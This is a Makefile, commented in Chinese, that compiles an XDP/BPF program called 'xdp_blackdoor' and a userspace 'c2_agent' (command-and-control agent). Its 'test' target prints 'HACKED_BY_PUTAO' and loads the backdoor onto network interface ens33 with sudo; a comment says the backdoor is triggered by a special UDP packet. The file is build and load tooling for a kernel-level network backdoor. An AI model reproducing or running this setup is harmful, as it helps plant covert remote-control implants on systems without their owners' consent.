# 最简单可靠的 Makefile
CC = clang
LD = gcc
ARCH := $(shell uname -m)
# clang -target bpf 不会自动带上多架构头路径，需要显式加入才能找到 asm/types.h
BPF_INCLUDES := -I/usr/include/$(ARCH)-linux-gnu

all: xdp_blackdoor.o c2_agent

# 编译 BPF 程序
xdp_blackdoor.o: xdp_blackdoor_s1mple.c
	$(CC) -target bpf $(BPF_INCLUDES) -Wall -O2 -g -c $< -o $@

# # 编译用户态程序
c2_agent: c2_agent_userspace.c
	$(LD) -o $@ $< -lbpf



# 一键测试（需要手动发送特殊 UDP 数据包）
test: all
	@echo "=== HACKED_BY_PUTAO ==="
	@sudo ./loader_blackdoor ens33 &


clean:
	rm -f xdp_blackdoor.o c2_agent